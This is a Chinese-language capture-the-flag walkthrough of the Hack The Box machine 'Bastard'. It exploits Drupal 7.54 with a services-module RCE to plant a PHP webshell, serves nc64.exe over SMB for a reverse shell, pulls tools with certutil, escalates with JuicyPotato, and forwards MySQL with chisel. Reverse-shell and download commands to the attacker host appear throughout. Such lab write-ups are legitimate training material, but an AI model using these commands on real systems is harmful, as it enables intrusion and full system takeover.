kali ip 10.10.16.3

# 信息搜集

1、端口探测

```bash
└─# IP=10.10.10.9                                                                                 
└─# nmap -A -sVC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# 80端口

找到 cms 与其版本，`Drupal 7.54`

<img src=".\图片\Snipaste_2023-08-31_14-43-21.png" alt="Snipaste_2023-08-31_14-43-21" style="zoom:80%;" />

```http
http://10.10.10.9/CHANGELOG.txt
http://10.10.10.9/robots.txt
```

寻找漏洞

```bash
└─# searchsploit drupal
```

经过筛选

```bash
└─# searchsploit drupal -m 41564 44449 44542
```

## 41564

修改脚本参数后尝试，报错

```bash
└─# php 41564.php 
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
PHP Fatal error:  Uncaught Error: Call to undefined function curl_init() in /root/Bastard/41564.php:254
Stack trace:
#0 /root/Bastard/41564.php(104): Browser->post()
#1 {main}
  thrown in /root/Bastard/41564.php on line 254
```

解决环境问题 [PHP: How to fix the "Call to undefined function curl_init()" error - Anto ./ Online](https://anto.online/guides/php-how-to-fix-the-call-to-undefined-function-curl_init-error/)

```bash
sudo apt-get install php-curl
```

接着利用，显示利用失败，于是再次观察利用脚本

```bash
└─# head -n 40 41564.php                                                                                                                                     1 ⨯
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
<?php
# Drupal Services Module Remote Code Execution Exploit
# https://www.ambionics.io/blog/drupal-services-module-rce
# cf
#
# Three stages:
# 1. Use the SQL Injection to get the contents of the cache for current endpoint
#    along with admin credentials and hash
# 2. Alter the cache to allow us to write a file and do so
# 3. Restore the cache
#

# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'zf1yolo.php',
    'data' => '<?php system($_POST[x]);?>'
];

$browser = new Browser($url . $endpoint_path);
```

发现可能是 `endpoint_path` 这个参数有问题，于是寻找 `endpoint_path` 的信息，找到官网 ` https://www.ambionics.io/blog/drupal-services-module-rce`

<img src=".\图片\Snipaste_2023-08-31_15-15-19.png" alt="Snipaste_2023-08-31_15-15-19" style="zoom:67%;" />

发现 endpoint_path 可能不是固定的，就要寻找 endpoint_path，脚本默认是 `/rest_endpoint` ，可能是 restful 网站结构。尝试目录爆破

可以尝试这个字典

```bash
/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

我们图方便，自己编一下字典

```bash
└─# cat restful.dic   
rest
restful
restful_endpoint
rest_endpoint
endpoint
admin
end
point
```

可以尝试用个新的目录扫描工具

```bash
└─# apt install feroxbuster 
```

```bash
└─# gobuster dir -u http://10.10.10.9 -w dic -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  
/rest                 (Status: 200) [Size: 62]
```

得到 rest_point 的路径为 /rest， 于是继续修改利用脚本，再次尝试利用

<img src=".\图片\Snipaste_2023-08-31_15-42-32.png" alt="Snipaste_2023-08-31_15-42-32" style="zoom:80%;" />

```bash
└─# php 41564.php                            
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/zf1yolo.php
```

于是，看看 webshell，可以执行命令，于是反弹shell

以下是新方法，注意：

下载nc到kali

```bash
└─# wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe   
```

kali**开启smb共享**

```bash
└─# locate smbserver
└─# python /usr/share/doc/python3-impacket/examples/smbserver.py share .
```

kali监听

```bash
└─# nc -lvnp 443
```

webshell 触发

```
\\10.10.16.3\share\nc64.exe -e cmd 10.10.16.3 443
```

<img src=".\图片\Snipaste_2023-08-31_16-11-03.png" alt="Snipaste_2023-08-31_16-11-03" style="zoom:80%;" />

```bash
C:\inetpub\drupal-7.54>whoami
nt authority\iusr
C:\Users\dimitris\Desktop>type user.txt
type user.txt
ccf31bd00128ba9da73ffa93e09eefc0
```

## 中场总结

利用了41564.php，除了得到了 webshell，还得到了两个文件

```bash
└─# cat user.json 
{
    "uid": "1",
    "name": "admin",
    "mail": "drupal@hackthebox.gr",
    "theme": "",
    "created": "1489920428",
    "access": "1693467506",
    "login": 1693467812,
    "status": "1",
    "timezone": "Europe\/Athens",
    "language": "",
    "picture": null,
    "init": "drupal@hackthebox.gr",
    "data": false,
    "roles": {
        "2": "authenticated user",
        "3": "administrator"
    },
    "rdf_mapping": {
        "rdftype": [
            "sioc:UserAccount"
        ],
        "name": {
            "predicates": [
                "foaf:name"
            ]
        },
        "homepage": {
            "predicates": [
                "foaf:page"
            ],
            "type": "rel"
        }
    },
    "pass": "$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE"
}                                               
```

```bash
└─# cat session.json 
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "pBAAPOKMIkqqfvXnyUfq8Gy5e9-SUnLX54zp1qr2ESc",
    "token": "KENMcfpxfJIt0_pyN1w2K_6KGiEkSriUFXxyXlbxZMI"
}     
```

可以尝试爆破 pass 的 hash `$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE`

```
└─# hash-identifier $S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE
└─# hashcat --help | grep Drupal                                                                                                                             1 ⨯
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
└─# hashcat -m 7900 hash.list /usr/share/wordlists/rockyou.txt 
```

这个爆破很久，意义不大

还可以替换 Cookie 得到管理员的权限，在后台寻找能不能命令执行的地方

之前找到了另一个利用脚本 `44449.rb`，也可以成功

```bash
ruby 44449.rb http://10.10.10.9
```

要得到交互性好点的shell，用 `nishang` 的 `Invoke-PowerShellTcp.ps1` 里的，增加 以下内容

<img src=".\图片\Snipaste_2023-08-31_16-31-56.png" alt="Snipaste_2023-08-31_16-31-56" style="zoom:80%;" />

再kali开启web服务，然后靶机访问触发

<img src=".\图片\Snipaste_2023-08-31_16-30-22.png" alt="Snipaste_2023-08-31_16-30-22" style="zoom:80%;" />



# 提权

```bash
C:\Users\dimitris\Desktop>systeminfo
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          30/8/2023, 11:15:53 §?
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.603 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.624 MB
Virtual Memory: In Use:    471 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

## 内核提权

[PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md)

有很多，这里尝试 烂土豆

```bash
C:\Users\dimitris\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

[LOLBAS (lolbas-project.github.io)](https://lolbas-project.github.io/)

靶机下载 `kali` 里的 `JuicyPotato.exe`

```
certutil.exe -urlcache -split -f http://10.10.16.3:5555/JuicyPotato.exe JuicyPotato.exe
certutil.exe -urlcache -split -f http://10.10.16.3:5555/nc64.exe nc64.exe
```

靶机执行

```
C:\inetpub\drupal-7.54\JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c C:\inetpub\drupal-7.54\nc64.exe -e cmd 10.10.16.3 4444"
```

kali 监听

```
└─# nc -lvvp 4444

c:\Users\Administrator\Desktop>type root.txt
type root.txt
113ea0c17e21bfba160b6efc3f383884
```

## UDF提权

```
C:\inetpub\drupal-7.54>netstat -ano
 TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1080
```

找到网站配置文件里的 mysql 的账号密码

```
root:mysql123!root
```

但是当前账号不能直接执行mysql的命令，可能访问受限，也可能交互性不好

```
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

### 端口转发

[Release v1.9.1 · jpillora/chisel · GitHub](https://github.com/jpillora/chisel/releases/tag/v1.9.1)

靶机下载

```
certutil.exe -urlcache -split -f http://10.10.16.3:5555/chisel1.8.1.exe chisel1.8.1.exe
```

kali执行

```bash
└─# chisel server -p 9595 reverse
```

靶机执行

```
chisel1.8.1.exe client 10.10.16.3:9595 R:3306:localhost:3306
```



### 截图

<img src=".\图片\Snipaste_2023-08-31_17-34-29.png" alt="Snipaste_2023-08-31_17-34-29" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-31_17-35-07.png" alt="Snipaste_2023-08-31_17-35-07" style="zoom:80%;" />

```bash
└─# locate mysqludf                                                                                                                                           1 ?
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
/usr/share/sqlmap/data/udf/mysql/linux/32/lib_mysqludf_sys.so_
/usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
/usr/share/sqlmap/data/udf/mysql/windows/32/lib_mysqludf_sys.dll_
/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
```

<img src=".\图片\Snipaste_2023-08-31_17-37-58.png" alt="Snipaste_2023-08-31_17-37-58" style="zoom:80%;" />

注意反斜杠转义
